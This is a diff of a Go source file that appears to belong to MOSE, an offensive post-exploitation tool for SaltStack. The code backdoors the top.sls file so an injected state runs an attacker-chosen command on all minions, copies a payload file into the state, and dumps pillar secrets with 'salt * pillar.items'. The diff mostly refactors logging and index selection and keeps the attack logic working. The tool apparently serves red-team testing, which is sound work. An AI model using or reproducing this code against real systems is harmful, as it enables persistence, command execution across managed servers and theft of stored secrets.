@@ -1,7 +1,3 @@
-// Copyright 2020 National Technology & Engineering Solutions of Sandia, LLC (NTESS).
-// Under the terms of Contract DE-NA0003525 with NTESS,
-// the U.S. Government retains certain rights in this software.
-
 package main
 
 import (
@@ -14,6 +10,7 @@ import (
 	"text/template"
 
 	"github.com/CrimsonK1ng/mose/pkg/moseutils"
+	"github.com/fatih/color"
 	"github.com/ghodss/yaml"
 	"github.com/gobuffalo/packr/v2"
 	utils "github.com/l50/goutils"
@@ -33,7 +30,9 @@ var (
 	a                = CreateAgent()
 	bdCmd            = a.Cmd
 	debug            = a.Debug
+	errmsg           = color.Red
 	localIP          = a.LocalIP
+	msg              = color.Green
 	osTarget         = a.OsTarget
 	saltState        = a.PayloadName
 	uploadFileName   = a.FileName
@@ -54,10 +53,11 @@ func init() {
 
 // backdoorTop backdoors the top.sls file found from searching the file system
 // topLoc is the filepath to the top.sls file on the system
-// This function will prompt the user for injection points into the top.sls
+// This method will prompt the user for injection points into the top.sls
 func backdoorTop(topLoc string) {
 	bytes, err := moseutils.ReadBytesFromFile(topLoc)
 	if err != nil {
+		log.Println(err)
 		log.Fatalf("Failed to backdoor the top.sls located at %s, exiting.", topLoc)
 	}
 
@@ -66,54 +66,71 @@ func backdoorTop(topLoc string) {
 	if err != nil {
 		log.Fatal(err)
 	}
-	// prompt questions before hand because reiterating through this is a monster
+	//I am going to prompt questions before hand because reiterating through this is a monster
 	ans, err := moseutils.AskUserQuestion("Would you like to inject all layers?", a.OsTarget)
 	if err != nil {
 		log.Fatalf("Quitting...")
 	}
 	injectAll := ans
 
-	ans, err = moseutils.AskUserQuestion("Would you like to add all to layers if no '*' is found?", a.OsTarget)
+	ans, err = moseutils.AskUserQuestion("Would you like to add  all to layers if no '*' is found?", a.OsTarget)
 	if err != nil {
 		log.Fatalf("Quitting...")
 	}
-	addAll := ans
+	addAllIfNone := ans
 
-	// mapOfInjects will store the fileroots and the hosts which a user can choose to inject
-	unmarshalled, mapOfInjects := injectYaml(unmarshalled, injectAll, addAll, nil)
+	// mapOfInjects will be a hashmap of hashmaps that point to what host and what fileroot we want to inject
+	unmarshalled, mapOfInjects := injectYaml(unmarshalled, injectAll, addAllIfNone, nil)
 
-	if injectAll || addAll {
+	if injectAll || addAllIfNone {
 		return
 	}
 
-	validIndex := make(map[int]bool, 0)
-	moseutils.Msg("Specific injection method requested, displaying indices to select")
-	for k, v := range mapOfInjects {
-		ind := 0
-		for k1 := range v {
-			moseutils.Info(fmt.Sprintf("[%d] Fileroot: %v Hosts: %v", ind, k, k1))
-			validIndex[ind] = true
-			ind++
-		}
-	}
-
-	if ans, err := moseutils.AskUserQuestionCommaIndex("Provide index of steps you would like to inject in the site.yml (ex. 1,3,...)", a.OsTarget, validIndex); err == nil {
+	validBool, validIndex := validateIndicies(mapOfInjects)
+	//log.Println(unmarshalled)
+	if ans, err := moseutils.IndexedUserQuestion("Provide index of steps you would like to inject in the site.yml (ex. 1,3,...)", a.OsTarget, validBool, func() { prettyPrint(validIndex) }); err == nil {
 		// Need to take the responses and then inject
-		for ind := range ans {
-			fileroot, hosts := getIndexInjects(mapOfInjects, ind)
-			if fileroot == "" || hosts == "" {
-				log.Fatal("Error locating index provided by user...")
+		for i, b := range ans {
+			if b {
+				for k, v := range mapOfInjects {
+					for k1, _ := range v {
+						if validIndex[i] == fmt.Sprintf("Fileroot: %v Hosts: %v", k, k1) {
+							mapOfInjects[k][k1] = true
+						}
+					}
+				}
 			}
-			// mark the injection point as true
-			mapOfInjects[fileroot][hosts] = true
 		}
-	} else {
+	} else if err != nil {
 		log.Fatalf("Quitting...")
 	}
 
 	unmarshalled, _ = injectYaml(unmarshalled, false, false, mapOfInjects)
 
 	writeYamlToTop(unmarshalled, topLoc)
+}
+
+func prettyPrint(data map[int]string) {
+	log.Println("Specific injection method requested, displaying indicies to select")
+	for i := 0; i < len(data); i++ {
+		moseutils.Msg(fmt.Sprintf("[%d] %s", i, data[i]))
+	}
+}
+
+func validateIndicies(data map[string]map[string]bool) (map[int]bool, map[int]string) {
+	validIndex := make(map[int]string, 0)
+	validIndexBool := make(map[int]bool, 0)
+	log.Println("Specific injection method requested, displaying indicies to select")
+	for k, v := range data {
+		ind := 0
+		for k1, _ := range v {
+			moseutils.Msg(fmt.Sprintf("[%d] Fileroot: %v Hosts: %v", ind, k, k1))
+			validIndex[ind] = fmt.Sprintf("Fileroot: %v Hosts: %v", k, k1)
+			validIndexBool[ind] = true
+			ind += 1
+		}
+	}
+	return validIndexBool, validIndex
 }
 
 /*
@@ -134,7 +151,7 @@ func injectYaml(unmarshalled map[string]interface{}, injectAll bool, addAllIfNon
 		injectPointsCreate = make(map[string]map[string]bool)
 	}
 
-	for k, v := range unmarshalled { // k is the fileroot if file_roots is not in the file
+	for k, v := range unmarshalled { //k is the fileroot if file_roots is not in the file
 		if k == "file_roots" { // There are two general cases for the top.sls. You can have a root element file_roots (optional)
 			for fileroot, frv := range v.(map[string]interface{}) { // unpack the fileroot such as base: interface{}
 				isAllFound := false
@@ -142,21 +159,21 @@ func injectYaml(unmarshalled map[string]interface{}, injectAll bool, addAllIfNon
 				if injectionMap == nil {
 					injectPointsCreate[fileroot] = make(map[string]bool)
 				}
-				for hosts := range frv.(map[string]interface{}) { // now unpack the hosts it will run on: '*': interface{}
-					if hosts == "'*'" { // check if all case exists
+				for hosts, _ := range frv.(map[string]interface{}) { //now unpack the hosts it will run on: '*': interface{}
+					if hosts == "'*'" { //check if all case exists
 						isAllFound = true
 					}
-					if injectAll { // now if this is set we just inject irregardless of host
+					if injectAll { //now if this is set we just inject irregardless of host
 						unmarshalled["file_roots"].(map[string]interface{})[fileroot].(map[string]interface{})[hosts] = append(unmarshalled["file_roots"].(map[string]interface{})[fileroot].(map[string]interface{})[hosts].([]interface{}), saltState)
 					}
-					// Add hosts to the injection Points
+					//Add hosts to the injection Points
 					if injectionMap == nil {
 						injectPointsCreate[fileroot][hosts] = true
 					} else if injectionMap[fileroot][hosts] {
 						unmarshalled["file_roots"].(map[string]interface{})[fileroot].(map[string]interface{})[hosts] = append(unmarshalled["file_roots"].(map[string]interface{})[fileroot].(map[string]interface{})[hosts].([]interface{}), saltState)
 					}
 				}
-				if !isAllFound && addAllIfNone { // '*' is not found so we make our own and add new key to base, prod, dev, etc..
+				if !isAllFound && addAllIfNone { //'*' is not found so we make our own and add new key to base, prod, dev, etc..
 					unmarshalled["file_roots"].(map[string]interface{})[fileroot].(map[string]interface{})["*"] = []string{saltState}
 				}
 			}
@@ -165,14 +182,14 @@ func injectYaml(unmarshalled map[string]interface{}, injectAll bool, addAllIfNon
 			if injectionMap == nil {
 				injectPointsCreate[k] = make(map[string]bool)
 			}
-			for hosts := range v.(map[string]interface{}) {
-				if hosts == "'*'" { // check if all case exists
+			for hosts, _ := range v.(map[string]interface{}) {
+				if hosts == "'*'" { //check if all case exists
 					isAllFound = true
 				}
 				if injectAll { // append to list of states to apply
 					unmarshalled[k].(map[string]interface{})[hosts] = append(unmarshalled[k].(map[string]interface{})[hosts].([]interface{}), saltState)
 				}
-				// Add hosts to the injection Points
+				//Add hosts to the injection Points
 				if injectionMap == nil {
 					injectPointsCreate[k][hosts] = false
 				} else if injectionMap[k][hosts] {
@@ -180,7 +197,7 @@ func injectYaml(unmarshalled map[string]interface{}, injectAll bool, addAllIfNon
 				}
 
 			}
-			if !isAllFound && addAllIfNone { // '*' is not found so we make our own and add new key to base, prod, dev, etc...
+			if !isAllFound && addAllIfNone { //'*' is not found so we make our own and add new key to base, prod, dev, etc...
 				unmarshalled[k].(map[string]interface{})["*"] = []string{saltState}
 			}
 		}
@@ -188,7 +205,7 @@ func injectYaml(unmarshalled map[string]interface{}, injectAll bool, addAllIfNon
 	return unmarshalled, injectPointsCreate
 }
 
-// createState creates the state that we provided during mose buidl
+// createState Creates the state that we provided during mose buidl
 // topLoc is the full path to top.sls
 // cmd is the command string to run if uploadFileName is not provided to agent.go
 func createState(topLoc string, cmd string) {
@@ -199,20 +216,20 @@ func createState(topLoc string, cmd string) {
 	stateFilePath := filepath.Join(topLocPath, saltState, saltState+".sls")
 
 	if moseutils.CreateFolders(stateFolders) && generateState(stateFilePath, cmd, saltState) {
-		moseutils.Msg("Successfully created the %s state at %s", saltState, stateFilePath)
-		moseutils.Msg("Adding folder %s to cleanup file", stateFolderLoc)
+		msg("Successfully created the %s state at %s", saltState, stateFilePath)
+		msg("Adding folder %s to cleanup file", stateFolderLoc)
 		// Track the folders for clean up purposes
 		moseutils.TrackChanges(cleanupFile, stateFolderLoc)
 		if uploadFileName != "" {
 			saltFileFolders := filepath.Join(stateFolderLoc, "files")
 
 			moseutils.CreateFolders([]string{saltFileFolders})
-			moseutils.Info("Copying  %s to module location %s", uploadFileName, saltFileFolders)
+			log.Printf("Copying  %s to module location %s", uploadFileName, saltFileFolders)
 			moseutils.CpFile(uploadFileName, filepath.Join(saltFileFolders, filepath.Base(uploadFileName)))
 			if err := os.Chmod(filepath.Join(saltFileFolders, filepath.Base(uploadFileName)), 0644); err != nil {
 				log.Fatal(err)
 			}
-			moseutils.Msg("Successfully copied and chmod file %s", filepath.Join(saltFileFolders, filepath.Base(uploadFileName)))
+			log.Printf("Successfully copied and chmod file %s", filepath.Join(saltFileFolders, filepath.Base(uploadFileName)))
 		}
 	} else {
 		log.Fatalf("Failed to create %s state", saltState)
@@ -279,7 +296,7 @@ func doCleanup(siteLoc string) {
 	path = path + ".bak.mose"
 
 	if !moseutils.FileExists(path) {
-		moseutils.Info("Backup file %s does not exist, skipping", path)
+		log.Printf("Backup file %s does not exist, skipping", path)
 	}
 	ans2 := false
 	if !ans {
@@ -305,7 +322,7 @@ func backupSite(siteLoc string) {
 		moseutils.CpFile(siteLoc, path+".bak.mose")
 		return
 	}
-	moseutils.Info("Backup of the top.sls (%v.bak.mose) already exists.", siteLoc)
+	log.Printf("Backup of the top.sls (%v.bak.mose) already exists.", siteLoc)
 	return
 }
 
@@ -318,11 +335,11 @@ func writeYamlToTop(topSlsYaml map[string]interface{}, fileLoc string) {
 		log.Fatal(err)
 	}
 
-	err = moseutils.WriteFile(fileLoc, marshalled, 0644)
+	err = moseutils.WriteBytesToFile(fileLoc, marshalled, 0644)
 	if err != nil {
 		log.Fatalf("error: %v", err)
 	}
-	moseutils.Msg("%s successfully created", fileLoc)
+	log.Printf("%s successfully created", fileLoc)
 }
 
 // getIndexInjects returns the key, value pairing for indexing into the unmarshalled data structure above
@@ -331,11 +348,11 @@ func writeYamlToTop(topSlsYaml map[string]interface{}, fileLoc string) {
 func getIndexInjects(mapOfInjects map[string]map[string]bool, index int) (string, string) {
 	for k, v := range mapOfInjects {
 		ind := 0
-		for k1 := range v {
+		for k1, _ := range v {
 			if ind == index {
 				return k, k1
 			}
-			ind++
+			ind += 1
 		}
 	}
 	return "", ""
@@ -344,18 +361,19 @@ func getIndexInjects(mapOfInjects map[string]map[string]bool, index int) (string
 // getPillarSecrets tries to print out the pillar.items
 // binLoc is the path to salt binary
 func getPillarSecrets(binLoc string) {
-	// Running command salt '*' pillar.items
+	//Running command salt '*' pillar.items
 	res, err := utils.RunCommand(binLoc, "*", "pillar.items")
 	if err != nil {
-		moseutils.ErrMsg("Error running command: %s '*' pillar.items", binLoc)
+		log.Printf("Error running command: %s '*' pillar.items", binLoc)
 		log.Fatal(err)
 	}
-	moseutils.Msg("%s", res)
+	msg("%s", res)
 
 	return
 }
 
-func main() { // parse args
+func main() {
+	// parse args
 	flag.Parse()
 
 	// gonna assume not root then we screwed
@@ -383,10 +401,10 @@ func main() { // parse args
 		log.Fatalf("Error backing up %s: %v, exiting...", topLoc, err)
 	}
 
-	moseutils.Msg("Backdooring the %s top.sls to run %s on all minions, please wait...", topLoc, bdCmd)
+	msg("Backdooring the %s top.sls to run %s on all minions, please wait...", topLoc, bdCmd)
 	backdoorTop(topLoc)
 	createState(topLoc, bdCmd)
 
-	moseutils.Info("Attempting to find secrets stored with salt Pillars")
+	log.Println("Attempting to find secrets stored with salt Pillars")
 	getPillarSecrets(strings.TrimSpace(binLoc))
 }
